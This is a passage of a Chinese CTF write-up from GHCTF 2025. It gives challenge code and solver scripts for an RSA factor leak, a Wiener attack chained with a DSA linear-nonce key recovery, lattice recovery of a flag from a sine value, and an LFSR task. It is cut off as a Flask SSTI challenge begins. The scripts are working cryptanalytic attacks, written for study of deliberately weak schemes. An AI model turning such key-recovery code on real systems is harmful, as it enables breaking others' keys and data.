class="number">4</span>*x*y^<span class="number">13</span> + <span class="number">3</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">2</span> - x^<span class="number">9</span>*y^<span class="number">4</span> - x^<span class="number">8</span>*y^<span class="number">5</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">10</span> - x^<span class="number">2</span>*y^<span class="number">11</span> - <span class="number">2</span>*x*y^<span class="number">12</span> - <span class="number">3</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">12</span> + x^<span class="number">11</span>*y + x^<span class="number">10</span>*y^<span class="number">2</span> + x^<span class="number">9</span>*y^<span class="number">3</span> + x^<span class="number">8</span>*y^<span class="number">4</span> - x^<span class="number">6</span>*y^<span class="number">6</span> - x^<span class="number">5</span>*y^<span class="number">7</span> - <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">9</span> - x^<span class="number">2</span>*y^<span class="number">10</span> - <span class="number">3</span>*x*y^<span class="number">11</span> - <span class="number">2</span>*y^<span class="number">12</span> + x^<span class="number">10</span>*y + <span class="number">5</span>*x^<span class="number">9</span>*y^<span class="number">2</span> + x^<span class="number">8</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">6</span> + x^<span class="number">4</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">9</span> + <span class="number">2</span>*x*y^<span class="number">10</span> + <span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">9</span>*y - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">3</span> - x^<span class="number">6</span>*y^<span class="number">4</span> + x^<span class="number">5</span>*y^<span class="number">5</span> + <span class="number">3</span>*x^<span class="number">4</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">8</span> - x*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">8</span>*y - <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">3</span> + x^<span class="number">5</span>*y^<span class="number">4</span> - x^<span class="number">4</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">7</span> + x*y^<span class="number">8</span> + <span class="number">4</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - x^<span class="number">7</span>*y - <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">3</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">4</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">6</span> + <span class="number">2</span>*x*y^<span class="number">7</span> - <span class="number">2</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">2</span> + <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">5</span> - x*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span> + <span class="number">6</span>*x^<span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">4</span> - <span class="number">2</span>*x*y^<span class="number">5</span> - <span class="number">3</span>*y^<span class="number">6</span> + x^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">4</span>*y + x^<span class="number">3</span>*y^<span class="number">2</span> + x^<span class="number">2</span>*y^<span class="number">3</span> - <span class="number">2</span>*x*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">3</span>*y + <span class="number">6</span>*x^<span class="number">2</span>*y^<span class="number">2</span> - <span class="number">3</span>*x*y^<span class="number">3</span> - <span class="number">2</span>*y^<span class="number">4</span> - <span class="number">5</span>*x^<span class="number">3</span> - <span class="number">2</span>*x^<span class="number">2</span>*y - <span class="number">2</span>*x*y^<span class="number">2</span> + <span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span> - x*y + y^<span class="number">2</span> - <span class="number">2</span>*x + <span class="number">2</span>*y - <span class="number">2</span></span><br><span class="line">w = <span class="number">12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line">c = <span class="number">10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line">need = [(-term[<span class="number">0</span>], term[<span class="number">1</span>].degree()) <span class="keyword">for</span> term <span class="keyword">in</span> f%(x-<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">sumpow = [<span class="number">4</span>] <span class="comment"># sumpow[i] = pow(2,p**i+q**i,n)</span></span><br><span class="line">sumpow.append(<span class="built_in">pow</span>(<span class="number">2</span>,n+<span class="number">1</span>,n)) <span class="comment"># (p*q + 1)%(p*q - p - q + 1) == p + q</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">32</span>):</span><br><span class="line">    sumpow.append(<span class="built_in">pow</span>(sumpow[i-<span class="number">1</span>],n+<span class="number">1</span>,n) * <span class="built_in">pow</span>(sumpow[i-<span class="number">2</span>],-n,n))</span><br><span class="line">    sumpow[-<span class="number">1</span>] %= n</span><br><span class="line">    <span class="comment"># p**i + q**i = (p + q)(p**(i-1) + q**(i-1)) - (p*q)(p**(i-2) + q**(i-2))</span></span><br><span class="line"></span><br><span class="line">f2 = f</span><br><span class="line">w2 = w</span><br><span class="line"><span class="keyword">for</span> coeff, deg <span class="keyword">in</span> need:</span><br><span class="line">    w2 *= <span class="built_in">pow</span>(sumpow[deg],coeff,n)</span><br><span class="line">    w2 %= n</span><br><span class="line">    f2 += coeff*(x**deg + y**deg)</span><br><span class="line"></span><br><span class="line">p = gcd(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(f2%(x-<span class="number">1</span>)),n) * <span class="built_in">pow</span>(w2,-<span class="number">1</span>,n) - <span class="number">1</span>, n)</span><br><span class="line">prefix = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">suffix = <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">length = <span class="number">88</span> - <span class="built_in">len</span>(prefix) - <span class="built_in">len</span>(suffix)</span><br><span class="line"></span><br><span class="line">c -= <span class="number">256</span>^(<span class="built_in">len</span>(suffix) + length) * bytes_to_long(prefix)</span><br><span class="line">c -= bytes_to_long(suffix)</span><br><span class="line">c = c * inverse(<span class="number">256</span>,p) % p</span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ,length+<span class="number">2</span>,length+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    L[i,i] = <span class="number">1</span></span><br><span class="line">    L[i,-<span class="number">1</span>] = <span class="number">256</span>^i</span><br><span class="line">    c -= <span class="number">256</span>^i*<span class="number">48</span></span><br><span class="line"></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">4</span></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">1</span>] = -c</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = p</span><br><span class="line">L[:,-<span class="number">1</span>:] *= <span class="number">2</span>^<span class="number">512</span></span><br><span class="line">res = L.LLL()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">abs</span>(i[-<span class="number">2</span>]) == <span class="number">4</span> <span class="keyword">and</span> <span class="built_in">all</span>(<span class="built_in">abs</span>(j) &lt; <span class="number">10</span> <span class="keyword">for</span> j <span class="keyword">in</span> i)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[:-<span class="number">2</span>][::-<span class="number">1</span>]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="number">48</span> + <span class="built_in">abs</span>(j))</span><br><span class="line">flag = prefix+flag.encode()+suffix</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="RSA-and-DSA"><a href="#RSA-and-DSA" class="headerlink" title="RSA_and_DSA"></a>RSA_and_DSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">ink=getPrime(<span class="number">20</span>)</span><br><span class="line">p1= getPrime(<span class="number">512</span>)</span><br><span class="line">q1= getPrime(<span class="number">512</span>)</span><br><span class="line">N = p1* q1</span><br><span class="line">phi = (p1-<span class="number">1</span>) * (q1-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d1= getRandomNBitInteger(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d1, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d1, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">c_ink = <span class="built_in">pow</span>(ink, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_ink=&#x27;</span>,c_ink)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e=&#x27;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N=&#x27;</span>,N)</span><br><span class="line"></span><br><span class="line">k= getPrime(<span class="number">64</span>)</span><br><span class="line">q = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg, pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">pow</span>(g, k, p) % q)</span><br><span class="line">    h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    s = <span class="built_in">int</span>((h + x * r) * gmpy2.invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    temp = q * getrandbits(<span class="number">864</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(temp + <span class="number">1</span>):</span><br><span class="line">        p = temp + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> p % q == <span class="number">1</span></span><br><span class="line">h = randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">g = <span class="built_in">pow</span>(h, (p - <span class="number">1</span>) // q, p)</span><br><span class="line">y = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">pub = (p,q,g,y)</span><br><span class="line">pri = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r1,s1)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r2,s2)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k+ink))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;g= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y= &#125;</span>&quot;</span>)</span><br><span class="line">key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxxxx&#125;&quot;</span></span><br><span class="line">ciphertext = cipher.encrypt(pad(flag.encode(), <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ciphertext = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c_ink= 75517502692097831363443739147565176367247985201143975453326891807623085586665800338505194812511215986799510259417486636115714543892322380908775898968005967267154089356401466517827082639942650711458196552847137272733225451581167527549711435805194039361007506436462393605949663173972848316802086005675594122447</span></span><br><span class="line"><span class="string">e= 97127528017076464922170978933159739328499830874876612140194720448608536284451056980759925228574802703400503852897647806707933102198339936307176078592550748707182506634151382952065240918923594664309561466538540752851827183955776181255541306419282376724578231110985180090748520497985751591062886932254909959583</span></span><br><span class="line"><span class="string">N= 131342286566556880877092331187418465653855813425966929864425381510875531237549624989644814104311810243468058174748867544024292263674725375273146689145421426693384862215460097683187892351130513429928063652701077721570140977719823754701988835199434602294597102748436781125528389125846980183998136743830655746063</span></span><br><span class="line"><span class="string">(r1,s1)= (116607429176396769010327954525649019081679807573, 242024511677350537268048640408155954695100314686)</span></span><br><span class="line"><span class="string">(r2,s2)= (282969697665204582571637561594660002955972273916, 233488943967710383661411268886726155900968304282)</span></span><br><span class="line"><span class="string">g= 113752591438136097752416877421595518178059067044406008965947486693591255247711343925741016027611310257564826355221058212913879375956265361413159461801130112690842862767232535007802294944943540511148985219047761964228666223605898858379133610079745082176804146052086680551043775640630819062323009071190616231206</span></span><br><span class="line"><span class="string">q= 1010682595723348988315901923086844563134854720501</span></span><br><span class="line"><span class="string">p= 117574623402990360322255542120443410701206393780334500865748478770699335257408652117586356058603035930256320433146236288486738066821845146885689024168044244453298677322763816219621376364185484753693835156465778487436550070788009331605135011517651578548403565196930955818239577581944709384126001757349228062611</span></span><br><span class="line"><span class="string">y= 114719310327856435690312712426667059528255758467780345974417610618467568889317865434557927492426543544900066735337367408842750916882737134575812646864528120528284507025781167314123831868039617392195979751697057669675359335622753482920688147222344801914086866640706838774098397923450797553056502975678740968481</span></span><br><span class="line"><span class="string">ciphertext = b&#x27;\x10\xbcL|\xcb\xe5W\x1e0\xa3\x83\x85vr^SmU\xac\xe3L\x93&quot;#\xb4\x81\xd0\xf0S\x05\xb7\xc7&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>首先是<strong>维纳攻击</strong>，这个没什么好说的，直接套板子</p><p>然后是<strong>熟悉的DSA</strong>，去年的<strong>国城杯CTF</strong>也接触过一题，不过那题是<strong>关系k攻击(k2=k1^2)，</strong>这题是<strong>线性k攻击(k2=k1+ink)</strong>，还是参考的这篇<a href="http://www.cynthia99.link/index.php/archives/2426/">博客</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">h = <span class="built_in">int</span>(hashlib.sha256(<span class="string">b&#x27;GHCTF-2025&#x27;</span>).digest().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">c_ink = <span class="number">75517502692097831363443739147565176367247985201143975453326891807623085586665800338505194812511215986799510259417486636115714543892322380908775898968005967267154089356401466517827082639942650711458196552847137272733225451581167527549711435805194039361007506436462393605949663173972848316802086005675594122447</span></span><br><span class="line">e = <span class="number">97127528017076464922170978933159739328499830874876612140194720448608536284451056980759925228574802703400503852897647806707933102198339936307176078592550748707182506634151382952065240918923594664309561466538540752851827183955776181255541306419282376724578231110985180090748520497985751591062886932254909959583</span></span><br><span class="line">N = <span class="number">131342286566556880877092331187418465653855813425966929864425381510875531237549624989644814104311810243468058174748867544024292263674725375273146689145421426693384862215460097683187892351130513429928063652701077721570140977719823754701988835199434602294597102748436781125528389125846980183998136743830655746063</span></span><br><span class="line">(r1, s1) = (<span class="number">116607429176396769010327954525649019081679807573</span>,</span><br><span class="line">            <span class="number">242024511677350537268048640408155954695100314686</span>)</span><br><span class="line">(r2, s2) = (<span class="number">282969697665204582571637561594660002955972273916</span>,</span><br><span class="line">            <span class="number">233488943967710383661411268886726155900968304282</span>)</span><br><span class="line">g = <span class="number">113752591438136097752416877421595518178059067044406008965947486693591255247711343925741016027611310257564826355221058212913879375956265361413159461801130112690842862767232535007802294944943540511148985219047761964228666223605898858379133610079745082176804146052086680551043775640630819062323009071190616231206</span></span><br><span class="line">q = <span class="number">1010682595723348988315901923086844563134854720501</span></span><br><span class="line">p = <span class="number">117574623402990360322255542120443410701206393780334500865748478770699335257408652117586356058603035930256320433146236288486738066821845146885689024168044244453298677322763816219621376364185484753693835156465778487436550070788009331605135011517651578548403565196930955818239577581944709384126001757349228062611</span></span><br><span class="line">y = <span class="number">114719310327856435690312712426667059528255758467780345974417610618467568889317865434557927492426543544900066735337367408842750916882737134575812646864528120528284507025781167314123831868039617392195979751697057669675359335622753482920688147222344801914086866640706838774098397923450797553056502975678740968481</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x10\xbcL|\xcb\xe5W\x1e0\xa3\x83\x85vr^SmU\xac\xe3L\x93&quot;#\xb4\x81\xd0\xf0S\x05\xb7\xc7&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span>  <span class="comment"># 分子</span></span><br><span class="line">    denominator = <span class="number">1</span>  <span class="comment"># 分母</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    res = []</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> d.bit_length() == <span class="number">200</span>:</span><br><span class="line">            res.append(d)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = wienerAttack(e, N)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    ink = <span class="built_in">pow</span>(c_ink, i, N)</span><br><span class="line">    k = (h*r2 - h*r1 + ink*s2*r1) * inverse(s1*r2 - s2*r1, q) % q</span><br><span class="line">    pri = (k*s1 - h) * inverse(r1, q) % q</span><br><span class="line">    key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Sin"><a href="#Sin" class="headerlink" title="Sin"></a>Sin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="built_in">print</span>((<span class="number">2</span> * sin((m := bytes_to_long(<span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span>))) - <span class="number">2</span> * sin(m) * cos(<span class="number">2</span> * m)).n(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">m的值即为flag</span></span><br><span class="line"><span class="string">0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这题让我想起了<a href="https://hvang10.github.io/2024/11/05/SHCTF2024-WriteUp/">SHCTF2024-week3-大学×高中√</a><br>形式稍微不一样，根据三角函数的倍角公式处理一下，得到题目给的值是$4sin^{3}(m)$</p><p>因为我们不知道<code>flag</code>的长度，所以格最后一列的大系数得测试一下(拿<code>SH</code>那题测)，发现大概是<code>flag</code>位数的<strong>两倍</strong>这样就能出</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">leak = <span class="number">0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412</span></span><br><span class="line">leak = (leak / <span class="number">4</span>)^(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line">asin = arcsin(leak)</span><br><span class="line">RF = RealField(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># RealField可以指定精度，RF默认53位</span></span><br><span class="line">pi = RF(pi)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = i*<span class="number">8</span></span><br><span class="line">    k0 = k*<span class="number">2</span></span><br><span class="line">    M = Matrix(QQ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>^k0],[<span class="number">0</span>,<span class="number">2</span>^k,<span class="number">2</span>^k0*asin],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^k0*<span class="number">2</span>*pi]])</span><br><span class="line">    m = <span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="river"><a href="#river" class="headerlink" title="river()"></a>river()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, seed, mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">踩踩背</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n, seed, mask, lfsr=<span class="literal">None</span></span>):</span><br><span class="line">        self.state = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;seed:<span class="number">0</span>&#123;n&#125;</span>b&#125;&quot;</span>]</span><br><span class="line">        self.mask_bits = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;mask:<span class="number">0</span>&#123;n&#125;</span>b&#125;&quot;</span>]</span><br><span class="line">        self.n = n</span><br><span class="line">        self.lfsr = lfsr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">sum</span>([self.state[i] * self.mask_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n)]) &amp; <span class="number">1</span></span><br><span class="line">        self.state = self.state[<span class="number">1</span>:] + [s]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.lfsr:</span><br><span class="line">            <span class="keyword">if</span> self.lfsr():</span><br><span class="line">                self.update()</span><br><span class="line">            <span class="keyword">return</span> self.state[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.update()</span><br><span class="line">            <span class="keyword">return</span> self.state[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">奶龙</span>(<span class="title class_ inherited__">踩踩背</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n, seed, mask</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(n, seed, mask, lfsr=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">64</span></span><br><span class="line"><span class="keyword">assert</span> seed.bit_length == mask.bit_length == n</span><br><span class="line">lfsr1 = 奶龙(n, seed, mask)</span><br><span class="line">lfsr2 = 踩踩背(n, seed, mask, lfsr1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mask = <span class="subst">&#123;mask&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;output = <span class="subst">&#123;<span class="built_in">sum</span>(lfsr2() &lt;&lt; (n - <span class="number">1</span> - i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># mask = 9494051593829874780</span></span><br><span class="line"><span class="comment"># output = 13799267741689921474</span></span><br><span class="line"><span class="comment"># enc = b&#x27;\x03\xd1#\xb9\xaa5\xff3y\xba\xcb\x91`\x9d4p~9r\xf6i\r\xca\x03dW\xdb\x9a\xd2\xa6\xc6\x85\xfa\x19=b\xb2)5&gt;]\x05,\xeb\xa0\x12\xa9\x1e&#x27; </span></span><br></pre></td></tr></table></figure><p>这题就没仔细研究，不好打，当时看着三解，最后五解，就摆了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>还是Csome那句话，在这CINTA是基础，Sagemath是工具，糖醋小鸡块的blog是弹药库(狗头)</strong></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置信息</span></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/uploads&#x27;</span>  <span class="comment"># 上传文件保存目录</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;txt&#x27;</span>, <span 